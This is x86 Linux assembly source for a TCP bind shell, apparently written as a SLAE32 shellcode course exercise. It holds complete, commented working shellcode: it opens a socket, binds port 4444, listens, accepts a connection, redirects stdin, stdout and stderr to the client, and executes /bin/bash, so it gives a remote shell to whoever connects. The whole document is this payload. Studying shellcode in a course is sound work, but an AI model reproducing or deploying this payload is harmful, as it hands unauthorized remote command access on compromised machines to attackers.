; TCP Bind Shell
; For SLAE32
;
; Howard McGreehan

global _start

section .text

_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        
        ; Push it to the stack for the socket(x,x, protocol) argument, set to IPPRORO_IP (0)
        push ecx

        ; socket(x, type, x) argument, set to SOCK_STREAM (1)
        push 0x1

        ; socket(domain, x, x) argument, set to AF_INET (2)
        push 0x2

        ; set socketcall(x, args) argument to ESP (the start of our args)
        ; Populate eax with socketcall (0x66)
        ; set socketcall(call, x) to 1 (sys_socket)
        mov ecx, esp
        mov al, 0x66
        mov bl, 0x1
        int 0x80

        ; Our socket file descriptor should be returned within EAX
        mov esi, eax

bind:
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

        ; set up bind socketcall
        mov al, 0x66
        mov bl, 2

        xor ecx, ecx

        ; set up the sockaddr struct (2, 4444, 0)
        push ecx

        push word 0x5C11
        push word 0x2

        ; save the location of the struct
        mov edi, esp

        ; push addrlen (size of sockaddr)
        push 16

        ; push sockaddr pointer
        push edi

        ; push sockfd pointer (loaded from eax earlier)
        push esi

        ; move stack pointer into ecx for args
        mov ecx, esp
        int 0x80


listen:

        ; int listen(int sockfd, int backlog)

        ; set up listen socketcall
        mov al, 0x66
        mov bl, 4

        ; push backlog
        push 0x5

        ; push sockfd
        push esi

        ; load args
        mov ecx, esp

        int 0x80


accept:

        ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

        ; set up accept socketcall
        inc bl
        mov al, 0x66

        ; zero out edx to push nulls
        xor edx, edx

        ; push sockaddr len (0)
        push edx

        ; push sockaddr pointer (0)
        push edx

        ; push sockfd pointer (saved from socket())
        push esi

        ; load args into ecx
        mov ecx, esp

        int 0x80

        ; eax contains returned clientfd from accept()
        ; let's save that out
        xchg ebx, eax
	xor ecx, ecx
	mov cl, 0x2

dup:

        ; int dup2(int oldfd, int newfd)

        ; load dup2 into eax 
        ; ecx has our counter for stdin/out/err
        
        mov al, 63
        int 0x80
	dec ecx
	jns dup

shell:

        ; int execve(const char *pathname, char *const argv[], char *const envp[])

        ; Zero Out eax for first null (envp) and push to stack
        xor eax, eax
        push eax

        ; Now, push the string bin bash onto the stack for argv
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        ; Now, need filename pointer
        ; EZ, pop into EBX
        mov ebx, esp

        ; push another null
        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        ; Now, set up syscall
        mov al, 0xb
        int 0x80

